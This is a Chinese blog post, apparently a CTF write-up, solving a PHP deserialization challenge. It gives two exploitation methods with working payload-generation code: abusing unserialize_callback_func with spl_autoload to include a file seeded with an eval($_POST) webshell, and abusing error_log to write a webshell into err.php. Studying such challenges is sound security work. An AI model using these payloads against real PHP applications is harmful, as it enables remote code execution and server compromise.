---
title: "某群一道反序列化题"
date: 2021-05-02T16:24:32+08:00
---

> 五一忽然就要过了..感觉要学的好没学，考试也没复习，早上12点在某ctf群看到在讨论这道题，就起床做做了...

题目给出源码：

```php
<?php
highlight_file(__FILE__);
class main{
    public $settings;
    public $params;

    public function __construct(){
        $this->settings=array(
        'display_errors'=>'On',
        'allow_url_fopen'=>'On'
        );
        $this->params=array();
    }
    public function __wakeup(){
        foreach ($this->settings as $key => $value) {
            ini_set($key, $value);
        }
    }
    public function __destruct(){
        file_put_contents('settings.inc', unserialize($this->params));
    }
}
unserialize($_GET['data']); 
```

## 法一 反序列化回调函数+后缀文件包含

给了源码就好说，在本地测试一下。我们可以对`settings.inc`文件进行写入，那自然想到的就是写入一句话然后进行文件包含，找一下有没有原生调用函数的方法。

![image-20210504171255837](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-04-image-20210504171255837.png)

就在官网手册的**unserialize()** 处发现了这个函数，官方给出的实例是这样的

```php
<?php
$serialized_object='O:1:"a":1:{s:5:"value";s:3:"100";}';

// unserialize_callback_func 从 PHP 4.2.0 起可用
ini_set('unserialize_callback_func', 'mycallback'); // 设置您的回调函数

function mycallback($classname) 
{
   // 只需包含含有类定义的文件
   // $classname 指出需要的是哪一个类
}
?>
```

看到这个`ini_set()`...居然和题目的`__wakeup()`一模一样，那百分之百没得跑了。具体来说只要反序列化实例不存在的类，调用`unserialize_callback_func`就会把类名作为参数传递给回调函数。那么我们的回调函数设置为什么呢？第一个想到的是`include`，但这有一个问题。

如果要包含`settings.inc`，就得实例化这个类，但php类名是不能存在`.`这个字符的，over，翻手册，找到了
一个`spl_autoload`函数。

![image-20210504235914738](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-04-image-20210504235914738.png)

这个函数支持使用`spl_autoload_extensions`拓展文件名

```php
<?php
spl_autoload_extensions(".php,.inc");
?>
```

如果没有，则默认这两个都拓展。拿一个小demo测试一下。

```php
<?php
ini_set("unserialize_callback_func","spl_autoload");
class main{
    public $a;
    public function __construct()
    {
        $this->a=new settings;
    }
}
// $demo=new main;
$string='O:4:"main":1:{s:1:"a";O:8:"settings":0:{}}';
var_dump(unserialize($string));
```

在`settings.inc`中写入`<?php echo "hello world"?>`

![image-20210505001830321](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505001830321.png)

在实例化**settings**这个类时调用了回调函数，执行`spl_autoload('settings')`，成功进行文件包含，那原题思路就很清晰了。

```php
<?php
class settings{}
class main{
    public $settings=array("unserialize_callback_func"=>"spl_autoload");
    public $params;
    public function __construct()
    {
        $this->params=serialize('<?php @eval($_POST[theoyu]) ?>');  
        /* $this->params=serialize(new settings);*/
    }
}
$demo =new main;
echo serialize($demo);
```

先写入一句话木马，再执行注释部分文件包含即可。

## 法二 利用错误信息写入一句胡

在群里看到有人说好像利用`err_log()`方法可以将报错的信息写入指定的文件，有点像phpmyadmin日志写马那种，我也尝试了一下。

```php
<?php
ini_set("error_log","err.php");
ini_set("unserialize_callback_func",'<?php eval($_POST[theoyu]); ?>');
class main{
    public $a;
    public function __construct()
    {
        $this->a=new settings;
    }
}
// $demo=new main;
$string='O:4:"main":1:{s:1:"a";O:8:"settings":0:{}}';
var_dump(unserialize($string));
```

思路是回调函数可控，调用回调函数时如果不存在就会报错，然后把函数设置为一句话即可。

![image-20210505005235360](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505005235360.png)

![image-20210505005919242](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505005919242.png)

看群里好像是有人为了防止`<$`类似字符转义，多加了一个`html_errors=true`,结果导致被转义了...

![image-20210505010415279](https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505010415279.png)

看来是这位师傅多此一举，事实上出题人确实可以用默认为转义模式，需要我们构造`html_errors=false`去反转义，也是一个思路。